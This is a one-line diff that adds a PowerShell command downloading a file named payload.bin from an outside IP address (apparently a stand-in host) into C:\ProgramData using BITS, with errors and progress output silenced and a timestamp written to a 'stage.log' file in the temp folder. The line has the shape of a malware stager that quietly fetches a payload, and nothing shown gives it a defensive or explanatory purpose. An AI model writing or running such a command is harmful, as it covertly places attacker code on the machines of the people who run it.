@@ -1,0 +1,1 @@
+$TargetUrl = "http://198.51.100.111/downloads/payload.bin"; $OutputPath = 'C:\ProgramData\payload.bin'; Start-BitsTransfer -Source $TargetUrl -Destination $OutputPath -ErrorAction SilentlyContinue; $ProgressPreference = "SilentlyContinue"; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
